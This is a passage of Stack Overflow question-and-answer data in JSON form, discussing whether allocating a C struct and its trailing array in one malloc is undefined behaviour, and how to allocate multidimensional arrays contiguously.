as there is no <i>array</i>.  I see no UB here,"}, {"owner": {"reputation": 1149, "user_id": 2472827, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5rYY.jpg?s=128&g=1", "display_name": "Neil", "link": "https://stackoverflow.com/users/2472827/neil"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1551841077, "post_id": 55014685, "comment_id": 96783996, "body": "True, I could have a <code>char [1]</code> on the end of <code>Array</code>; does that matter very much?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1551841191, "post_id": 55014685, "comment_id": 96784029, "body": "The UB is asserted to be due to invalid array usage.  Without an array, it is hard to support a UB claim due to that,"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1551841496, "post_id": 55014685, "comment_id": 96784106, "body": "Having <code>char [1]</code> on the end of <code>Array</code> changes the type of <code>struct Array</code>, yet there is still no <code>struct Array</code> <i>array</i> here.  <code>struct Array foo[1]</code>; is an <i>array</i>.  <code>struct Array *a;</code> is a pointer."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1551841617, "post_id": 55014685, "comment_id": 96784136, "body": "@chux Pointer arithmetic on a non-array object behaves as if it was an array of length 1 as per 6.5.6p7."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1551841685, "post_id": 55014685, "comment_id": 96784153, "body": "The UB of the quote &quot;This example has undefined behavior...&quot;` is not of posted code, but of the linked &quot;Use the correct syntax...&quot;.  In that code, there is array access outside array bounds.  I guess I do not see how this non-comparable code is suppose to have UB."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1551841890, "post_id": 55014685, "comment_id": 96784190, "body": "@dbush Yes, no news on <a href=\"https://stackoverflow.com/questions/55014685/multiple-structures-in-a-single-malloc-invoking-undefined-behaviour?noredirect=1#comment96784136_55014685\">that</a> - how do you see that relevant to somehow considering OP&#39;s code UB?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1551842146, "post_id": 55014685, "comment_id": 96784243, "body": "IMO, the mistake is asserting this code is alike enough to the referenced code (which has UB) and then incorrectly inferring this code also has UB.  Perhaps I am simply missing OP&#39;s point."}, {"owner": {"reputation": 1149, "user_id": 2472827, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5rYY.jpg?s=128&g=1", "display_name": "Neil", "link": "https://stackoverflow.com/users/2472827/neil"}, "edited": false, "score": 0, "creation_date": 1551842233, "post_id": 55014685, "comment_id": 96784263, "body": "So the UB is due to having an index-out-of-bounds?"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1551842307, "post_id": 55014685, "comment_id": 96784288, "body": "@chux Actually, I think the pointer arithmetic is OK in this case.  There are potential alignment issues however."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1551842330, "post_id": 55014685, "comment_id": 96784293, "body": "In the linked example, yes, UB due to index-out-of-bounds"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1551842401, "post_id": 55014685, "comment_id": 96784306, "body": "@dbush In OP&#39;s case, no alignment issues with <code>char</code>, yet as per your good answer, possible with various other types."}], "answers": [{"comments": [{"owner": {"reputation": 1149, "user_id": 2472827, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5rYY.jpg?s=128&g=1", "display_name": "Neil", "link": "https://stackoverflow.com/users/2472827/neil"}, "edited": false, "score": 0, "creation_date": 1551842600, "post_id": 55014974, "comment_id": 96784347, "body": "Is there any way to align an array so that this would work? Just put more data in <code>Array</code>?"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 1149, "user_id": 2472827, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5rYY.jpg?s=128&g=1", "display_name": "Neil", "link": "https://stackoverflow.com/users/2472827/neil"}, "edited": false, "score": 1, "creation_date": 1551842757, "post_id": 55014974, "comment_id": 96784373, "body": "@NeilEdelman You would need to determine the alignment requirements of the struct and the alignment requirement of the pointed-to type.  If the former is less, then you need to round up to the next multiple of the latter and point there."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1551868348, "post_id": 55014974, "comment_id": 96795288, "body": "Effective type didn&#39;t exist in C90 though."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 2, "last_activity_date": 1551843184, "last_edit_date": 1551843184, "creation_date": 1551842245, "answer_id": 55014974, "question_id": 55014685, "link": "https://stackoverflow.com/questions/55014685/multiple-structures-in-a-single-malloc-invoking-undefined-behaviour/55014974#55014974", "title": "Multiple structures in a single malloc invoking undefined behaviour?", "body": "<p>This should be well defined:</p>\n\n<pre><code>a-&gt;array = (char *)(a + 1);\n</code></pre>\n\n<p>Because you create a pointer to one element past the end of an array of size 1 but do not dereference it.  And because <code>a-&gt;array</code> now points to bytes that do not yet have an effective type, you can use them safely.</p>\n\n<p>This only works however because you're using the bytes that follow as an array of <code>char</code>.  If you instead tried to create an array of some other type whose size is greater than 1, you could have alignment issues.  </p>\n\n<p>For example, if you compiled a program for ARM with 32 bit pointers and you had this:</p>\n\n<pre><code>struct Array {\n    int size;\n    uint64_t *a;\n};\n...\nArray a = malloc(sizeof *a + (length * sizeof(uint64_t)));\na-&gt;length = length;\na-&gt;a= (uint64_t *)(a + 1);       // misaligned pointer\na-&gt;a[0] = 0x1111222233334444ULL;  // misaligned write\n</code></pre>\n\n<p>Your program would crash due to a misaligned write.  So in general you shouldn't depend on this.  Best to stick with a flexible array member which the standard guarantees will work.</p>\n"}, {"comments": [{"owner": {"reputation": 1149, "user_id": 2472827, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5rYY.jpg?s=128&g=1", "display_name": "Neil", "link": "https://stackoverflow.com/users/2472827/neil"}, "edited": false, "score": 2, "creation_date": 1551843258, "post_id": 55015074, "comment_id": 96784479, "body": "Extremely clever!"}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 2, "last_activity_date": 1551899801, "last_edit_date": 1551899801, "creation_date": 1551842986, "answer_id": 55015074, "question_id": 55014685, "link": "https://stackoverflow.com/questions/55014685/multiple-structures-in-a-single-malloc-invoking-undefined-behaviour/55015074#55015074", "title": "Multiple structures in a single malloc invoking undefined behaviour?", "body": "<p>As an adjunct to <a href=\"https://stackoverflow.com/a/55014974/2410359\">@dbush</a> good answer, a way to get around alignment woes is to use a <code>union</code>. This insures <code>&amp;p[1]</code> is properly aligned for <code>(uint64_t*)</code><sup>1</sup>.  <code>sizeof *p</code> includes any needed padding vs. <code>sizeof *a</code>.</p>\n\n<pre><code>  union {\n    struct Array header;\n    uint64_t dummy;\n  } *p;\n  p = malloc(sizeof *p + length*sizeof p-&gt;header-&gt;array);\n\n  struct Array *a = (struct Array *)&amp;p[0]; // or = &amp;(p-&gt;header);\n  a-&gt;length = length;\n  a-&gt;array = (uint64_t*) &amp;p[1]; // or &amp;p[1].dummy;\n</code></pre>\n\n<p>Or go with C99 and flexible array member.</p>\n\n<hr>\n\n<p><sup>1</sup> As well as <code>struct Array</code></p>\n"}, {"tags": [], "owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "is_accepted": false, "score": 1, "last_activity_date": 1551981482, "creation_date": 1551981482, "answer_id": 55050113, "question_id": 55014685, "link": "https://stackoverflow.com/questions/55014685/multiple-structures-in-a-single-malloc-invoking-undefined-behaviour/55050113#55050113", "title": "Multiple structures in a single malloc invoking undefined behaviour?", "body": "<p>Before the publication of C89, there were some implementations that would attempt to identify and trap upon out-of-bounds array accesses.  Given something like:</p>\n\n<pre><code>struct foo {int a[4],b[4];} *p;\n</code></pre>\n\n<p>such implementations would squawk at an effort to access <code>p-&gt;a[i]</code> if <code>i</code> wasn't in the range 0 to 3.  For programs that don't need to index the address of array-type lvalue <code>p-&gt;a</code> to access anything outside that array, being able to trap on such out-of-bounds accesses would be useful.</p>\n\n<p>The authors of C89 were also almost certainly aware that it was common for programs to use the address of dummy-sized array at the end of a structure as a means of accessing storage beyond the structure.  Using such techniques made it possible to do things that couldn't be done nearly as nicely otherwise, and part of the Spirit of C, according to the authors of the Standard, is \"Don't prevent the programmer from doing what needs to be done\".</p>\n\n<p>Consequently, the authors of the Standard treated such accesses as something which implementations could support or not, at their leisure, presumably based upon what would be most useful for their customers.  While it would often be helpful for implementations which would normally bounds-check accesses to structures in an array, to provide an option to omit such checks in cases where the last item of an indirectly-accessed structure is an array with one element (or, if they extend the language to waive a compile-time constraint, zero elements), people writing such implementations would presumably be capable of recognizing such things without the authors of the Standard having to tell them.  The notion that \"Undefined Behavior\" was intended as some form of prohibition doesn't seem to have really taken hold until after the publication of C89's successor standard.</p>\n\n<p>With regard to your example, having a pointer within a struct point to later storage in the same allocation should work, but with a couple of caveats:</p>\n\n<ol>\n<li><p>If the allocation is passed to <code>realloc</code>, the pointer within it will become invalid.</p></li>\n<li><p>The only real advantage of using a pointer versus a flexible array member is that it allows for the possibility of having it point somewhere else.  That may be good if the only kind of \"something else\" will always be an constant object of static duration that never has to be freed, or perhaps if it is some other kind of object that won't have to be freed, but may be problematical if it could hold the only reference to something stored in a separate allocation.</p></li>\n</ol>\n\n<p>Flexible array members have been available as an extension in some compilers before C89 was written, and were officially added in C99.  Any decent compiler should support them.</p>\n"}, {"comments": [{"owner": {"reputation": 1149, "user_id": 2472827, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5rYY.jpg?s=128&g=1", "display_name": "Neil", "link": "https://stackoverflow.com/users/2472827/neil"}, "edited": false, "score": 0, "creation_date": 1551990809, "post_id": 55050189, "comment_id": 96854591, "body": "That&#39;s what the CM Wiki says is undefined behaviour. @chux points out in the comments that it&#39;s because the index is out-of-bounds. CM Wiki also says, &quot;although the incorrect syntax will work on most implementations,&quot; and rates it, &quot;Unlikely,&quot; and says, &quot;This approach may be the only alternative for compilers that do not yet implement the standard C [99] syntax.&quot;"}, {"owner": {"reputation": 6023, "user_id": 2417459, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/QcuXb.png?s=128&g=1", "display_name": "i486", "link": "https://stackoverflow.com/users/2417459/i486"}, "reply_to_user": {"reputation": 1149, "user_id": 2472827, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5rYY.jpg?s=128&g=1", "display_name": "Neil", "link": "https://stackoverflow.com/users/2472827/neil"}, "edited": false, "score": 0, "creation_date": 1552034778, "post_id": 55050189, "comment_id": 96867466, "body": "OK but the idea for such implementation is bad. My suggestion is for something similar which uses less memory, without pointer and UB."}], "tags": [], "owner": {"reputation": 6023, "user_id": 2417459, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/QcuXb.png?s=128&g=1", "display_name": "i486", "link": "https://stackoverflow.com/users/2417459/i486"}, "is_accepted": false, "score": 0, "last_activity_date": 1551982399, "last_edit_date": 1551982399, "creation_date": 1551981850, "answer_id": 55050189, "question_id": 55014685, "link": "https://stackoverflow.com/questions/55014685/multiple-structures-in-a-single-malloc-invoking-undefined-behaviour/55050189#55050189", "title": "Multiple structures in a single malloc invoking undefined behaviour?", "body": "<p>You can define struct <code>Array</code> as:</p>\n\n<pre><code>struct Array\n{\n    size_t length;\n    char array[1];\n}; /* +(length + 1) char */\n</code></pre>\n\n<p>then <code>malloc( sizeof *a + length )</code>. The \"+1\" element is in <code>array[1]</code> member. Fill structure with:</p>\n\n<pre><code>a-&gt;length = length;\nstrcpy( a-&gt;array, str );\n</code></pre>\n"}], "owner": {"reputation": 1149, "user_id": 2472827, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5rYY.jpg?s=128&g=1", "display_name": "Neil", "link": "https://stackoverflow.com/users/2472827/neil"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 129, "favorite_count": 1, "accepted_answer_id": 55014974, "answer_count": 4, "score": 3, "last_activity_date": 1551982399, "creation_date": 1551839862, "last_edit_date": 1551840211, "question_id": 55014685, "link": "https://stackoverflow.com/questions/55014685/multiple-structures-in-a-single-malloc-invoking-undefined-behaviour", "title": "Multiple structures in a single malloc invoking undefined behaviour?", "body": "<p>From <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/DCL38-C.+Use+the+correct+syntax+when+declaring+a+flexible+array+member\" rel=\"nofollow noreferrer\">Use the correct syntax when declaring a flexible array member</a> it says that when <code>malloc</code> is used for a header and flexible data when <code>data[1]</code> is hacked into the <code>struct</code>,</p>\n\n<blockquote>\n  <p>This example has undefined behavior when accessing any element other\n  than the first element of the data array. (See the C Standard, 6.5.6.)\n  Consequently, the compiler can generate code that does not return the\n  expected value when accessing the second element of data.</p>\n</blockquote>\n\n<p>I looked up the C Standard 6.5.6, and could not see how this would produce undefined behaviour. I've used a pattern that I'm comfortable with, where the header is implicitly followed by data, using the same sort of <code>malloc</code>,</p>\n\n<pre><code>#include &lt;stdlib.h&gt; /* EXIT malloc free */\n#include &lt;stdio.h&gt;  /* printf */\n#include &lt;string.h&gt; /* strlen memcpy */\n\nstruct Array {\n    size_t length;\n    char *array;\n}; /* +(length + 1) char */\n\nstatic struct Array *Array(const char *const str) {\n    struct Array *a;\n    size_t length;\n    length = strlen(str);\n    if(!(a = malloc(sizeof *a + length + 1))) return 0;\n    a-&gt;length = length;\n    a-&gt;array = (char *)(a + 1); /* UB? */\n    memcpy(a-&gt;array, str, length + 1);\n    return a;\n}\n\n/* Take a char off the end just so that it's useful. */\nstatic void Array_to_string(const struct Array *const a, char (*const s)[12]) {\n    const int n = a-&gt;length ? a-&gt;length &gt; 9 ? 9 : (int)a-&gt;length - 1 : 0;\n    sprintf(*s, \"&lt;%.*s&gt;\", n, a-&gt;array);\n}\n\nint main(void) {\n    struct Array *a = 0, *b = 0;\n    int is_done = 0;\n    do { /* Try. */\n        char s[12], t[12];\n        if(!(a = Array(\"Foo!\")) || !(b = Array(\"To be or not to be.\"))) break;\n        Array_to_string(a, &amp;s);\n        Array_to_string(b, &amp;t);\n        printf(\"%s %s\\n\", s, t);\n        is_done = 1;\n    } while(0); if(!is_done) {\n        perror(\":(\");\n    } {\n        free(a);\n        free(b);\n    }\n    return is_done ? EXIT_SUCCESS : EXIT_FAILURE;\n}\n</code></pre>\n\n<p>Prints,</p>\n\n<pre><code>&lt;Foo&gt; &lt;To be or &gt;\n</code></pre>\n\n<p>The compliant solution uses <code>C99</code> flexible array members. The page also says,</p>\n\n<blockquote>\n  <p>Failing to use the correct syntax when declaring a flexible array\n  member can result in undefined behavior, although the incorrect syntax\n  will work on most implementations.</p>\n</blockquote>\n\n<p>Technically, does this <code>C90</code> code produce undefined behaviour, too? And if not, what is the difference? (Or the Carnegie Mellon Wiki is incorrect?) What is the factor on the implementations this will not work on?</p>\n"}, {"tags": ["c", "malloc"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1551839422, "post_id": 55014564, "comment_id": 96783616, "body": "Judging from what I see, the 3D array is not contiguous. I doubt if the 4D array is contiguous either.  To some extent, it depends on what you want to be contiguous.  But multiple memory allocations prevent contiguity."}, {"owner": {"reputation": 1084, "user_id": 2367317, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/b298f0703129088201b05e198f2e7c08?s=128&d=identicon&r=PG", "display_name": "Novice C", "link": "https://stackoverflow.com/users/2367317/novice-c"}, "edited": false, "score": 0, "creation_date": 1551839602, "post_id": 55014564, "comment_id": 96783669, "body": "What does <code>array[0][0] = (void*)calloc(n3*n2*n1, size))</code> do? I thought this allocated enough contiguous memory at the address of array[0][0] to be the entire 3d array of size n3*n2*n1*size? If all this hubbub isn&#39;t about being contiguous would either you be able to shed light why the author went through this trouble? And then the for loops are patching up the addresses to be the appropriate bytes away from the other indexes."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1551847165, "post_id": 55014564, "comment_id": 96785351, "body": "Note that <code>****calloc_4d_array</code> is not a 4D array like <code>int p[2][3][5][7]</code> is.  <code>calloc_4d_array</code> is a <a href=\"https://cdecl.org/?q=void+%2A%2A%2A%2Acalloc_4d_array\" rel=\"nofollow noreferrer\">pointer to pointer to pointer to pointer to void</a>."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 0, "creation_date": 1551857884, "post_id": 55014564, "comment_id": 96789241, "body": "Related: <a href=\"https://stackoverflow.com/q/42094465/694733\">Correctly allocating multi-dimensional arrays</a>"}], "answers": [{"tags": [], "owner": {"reputation": 351, "user_id": 10443813, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b0ee2ae00e0a906599c69e0e698035d0?s=128&d=identicon&r=PG&f=1", "display_name": "KL-Yang", "link": "https://stackoverflow.com/users/10443813/kl-yang"}, "is_accepted": false, "score": 0, "last_activity_date": 1551851793, "last_edit_date": 1551851793, "creation_date": 1551851303, "answer_id": 55016383, "question_id": 55014564, "link": "https://stackoverflow.com/questions/55014564/contiguous-memory-for-multidimensional-array/55016383#55016383", "title": "Contiguous memory for multidimensional array", "body": "<p>This should allocate 2 and above dimensions array continuously use recursion. Suggest use FORTRAN for such kind of high dimensional computation, this is not memory efficient. The example seems valgrind clean.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;assert.h&gt;\nvoid *alloc_nd(int *dim, int nd, size_t size)\n{\n    assert(nd&gt;=2);\n    void **p = malloc(sizeof(void*)*dim[0]);\n    if(nd==2) {\n        p[0] = malloc(size*dim[0]*dim[1]);\n        for(int i=1; i&lt;dim[0]; i++)\n            p[i] = p[i-1]+size*dim[1];\n    } else {\n        int xd[nd-1]; \n        for(int i=1; i&lt;nd; i++)\n            xd[i-1] = dim[i];\n        xd[0] *= dim[0];        //callapse the 1st two dimension\n        p[0] = alloc_nd(xd, nd-1, size);\n        for(int i=1; i&lt;dim[0]; i++)\n            p[i] = p[i-1]+sizeof(void*)*dim[1];\n    }\n    return p;\n}\n\nvoid free_nd(void *p, int nd)\n{\n    if(nd==2) {\n        free(((void**)p)[0]);\n        free(p);\n    } else {\n        free_nd(((void**)p)[0], nd-1);\n        free(p);\n    }\n}\n\nint main()\n{\n    int dim[] = {3,4,5,6};\n    int ****array;\n    array = (int****)alloc_nd(dim, 4, sizeof(int));\n    for(int i0=0; i0&lt;dim[0]; i0++)\n        for(int i1=0; i1&lt;dim[1]; i1++)\n            for(int i2=0; i2&lt;dim[2]; i2++)\n                for(int i3=0; i3&lt;dim[3]; i3++)\n                    array[i0][i1][i2][i3] = i0+i1+i2+i3;\n    int *p = &amp;array[0][0][0][0];  //do you mean continuous in this way? \n    for(int i=0; i&lt;dim[0]*dim[1]*dim[2]*dim[3]; i++)\n        printf(\"p[%5d]=%d\\n\", i, p[i]);\n    free_nd(array, 4);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 1084, "user_id": 2367317, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/b298f0703129088201b05e198f2e7c08?s=128&d=identicon&r=PG", "display_name": "Novice C", "link": "https://stackoverflow.com/users/2367317/novice-c"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 124, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1551851793, "creation_date": 1551838927, "last_edit_date": 1551842159, "question_id": 55014564, "link": "https://stackoverflow.com/questions/55014564/contiguous-memory-for-multidimensional-array", "title": "Contiguous memory for multidimensional array", "body": "<p>I believe this code forces memory allocation for a 3-d array to be contiguous.</p>\n\n<pre><code>void ***calloc_3d_array(size_t n3, size_t n2, size_t n1, size_t size){\n  void ***array;\n  size_t i, j;\n\n  if ((array = (void***)calloc(n3, sizeof(void**))) == NULL) {\n    printf(\"[calloc_3d] failed to allocate memory for %d 1st-pointers\\n\",\n              (int)n3);\n    return NULL;\n  }\n\n  if ((array[0] = (void**)calloc(n3*n2, sizeof(void*))) == NULL) {\n    printf(\"[calloc_3d] failed to allocate memory for %d 2nd-pointers\\n\",\n              (int)(n3*n2));\n    free((void*)array);\n    return NULL;\n  }\n\n  for (i=1; i&lt;n3; i++) {\n    array[i] = (void**)((unsigned char*)array[0]+i*n2*sizeof(void*));\n  }\n\n  if ((array[0][0] = (void*)calloc(n3*n2*n1, size)) == NULL) {\n    printf(\"[calloc_3d] failed to alloc. memory (%d X %d X %d of size %d)\\n\",\n              (int)n3, (int)n2, (int)n1, (int)size);\n    free((void*)array[0]);\n    free((void*)array);\n    return NULL;\n  }\n\n  for (j=1; j&lt;n2; j++) {\n    array[0][j] = (void**)((unsigned char*)array[0][j-1]+n1*size);\n  }\n\n  for (i = 1; i &lt; n3; i++) {\n    array[i][0] = (void**)((unsigned char*)array[i-1][0]+n2*n1*size);\n    for (j = 1; j &lt; n2; j++) {\n      array[i][j] = (void**)((unsigned char*)array[i][j-1]+n1*size);\n    }\n  }\n\n  return array;\n}\n</code></pre>\n\n<p>I am trying to alter this into a function that allocates a 4-d array contiguously. I do not fully understand the 3-d case flawless, so abstracting to a 4th dimension is a little shaky. I mostly unsure exactly why in any loop we have either array[i] = (void**) or array[i][j] = (void**) in the 3d code, so in the 4d code I have all the array[i][j][k] = (void***). Here is what I currently have</p>\n\n<pre><code>void ****calloc_4d_array(size_t n4, size_t n3, size_t n2, size_t n1, size_t size){\n  void ****array;\n  size_t i, j, k;\n\n  /* Alloc array of 3d pointers */\n  if ((array = (void****)calloc(n4, sizeof(void***))) == NULL) {\n    printf(\"[calloc_3d] failed to allocate memory for %d 1st-pointers\\n\",\n              (int)n4);\n    return NULL;\n  }\n\n  /* In first slot allocate a entire 2d pointer array */\n  if ((array[0] = (void***)calloc(n4*n3, sizeof(void**))) == NULL) {\n    printf(\"[calloc_3d] failed to allocate memory for %d 2nd-pointers\\n\",\n              (int)(n4*n3));\n    free((void*)array);\n    return NULL;\n  }\n\n  /* Loop over slots and adjust address to accommodate 2d pointers */\n  for (i = 1; i &lt; n4; i++) {\n    array[i] = (void***)((unsigned char*)array[0]+i*n3*sizeof(void**));\n  }\n\n  /* In the first 2d pointer, allocate the entire space for 1d pointers*/\n  if ((array[0][0] = (void**)calloc(n4*n3*n2, sizeof(void*))) == NULL) {\n    printf(\"[calloc_3d] failed to allocate memory for %d 3rd-pointers\\n\",\n              (int)(n4*n3*n2));\n    free((void*)array[0]);\n    free((void*)array);\n    return NULL;\n  }\n\n  /* Loop over other 2d slots and adjust address to accommodate type */\n  for (j=1; j&lt;n3; j++) {\n    array[0][j] = (void**)((unsigned char*)array[0][j-1]+n2*size);\n  }\n  for (i=1; i&lt;n4; i++) {\n    array[i][0] = (void**)((unsigned char*)array[i-1][0]+n3*n2*size);\n    for (j=1; j&lt;n3; j++) {\n      array[i][j] = (void**)((unsigned char*)array[i][j-1]+n2*size);\n    }\n  }\n\n  /* Finally allocate for entire array */\n  if ((array[0][0][0] = (void*)calloc(n4*n3*n2*n1, size)) == NULL) {\n    printf(\"[calloc_3d] failed to alloc. memory (%d X %d X %d X %d of size %d)\\n\",\n              (int)n4, (int)n3, (int)n2, (int) n1, (int)size);\n    free((void*)array[0][0]);\n    free((void*)array[0]);\n    free((void*)array);\n    return NULL;\n  }\n\n\n  for (k=1; k&lt;n2; k++) {\n    array[0][0][k] = (void***)((unsigned char*)array[0][0][k-1]+n1*size);\n  }\n  for (j=1; j&lt;n3; j++) {\n    array[0][j][0] = (void***)((unsigned char*)array[0][j-1][0]+n2*n1*size);\n    for (k=1; k&lt;n2; k++) {\n      array[0][j][k] = (void***)((unsigned char*)array[0][j][k-1]+n1*size);\n    }\n  }\n  for(i=1; i&lt;n4; i++) {\n    array[i][0][0] = (void***)((unsigned char*)array[i-1][0][0]+n3*n2*n1*size);\n    for (j=1; j&lt;n3; j++) {\n      array[i][j][0] = (void***)((unsigned char*)array[i][j-1][0]+n2*n1*size);\n      for (k=1; k&lt;n2; k++) {\n        array[i][j][k] = (void***)((unsigned char*)array[i][j][k-1]+n1*size);\n      }\n    }\n  }\n\n  return array;\n}\n</code></pre>\n\n<p><strong>Edit</strong>: The compiler gave me a warning relating to my (void***) question, and it seems to make sense that array[][] is a (void**), but I still don't know why it is happy with array[i] = (void***) instead of array[i] = (void*). Otherwise said, why is it (void*) with calloc <code>array[0][0][0] = (void*)calloc(n4*n3*n2*n1, size)</code>, but (void***) when using the bit shifting/setting the address(?) <code>array[0][0][k] = (void***)((unsigned char*)array[0][0][k-1]+n1*size);</code>? I would think whatever kind of object array[][][] is either (void*) or (void***).</p>\n"}, {"tags": ["c++", "c", "linux", 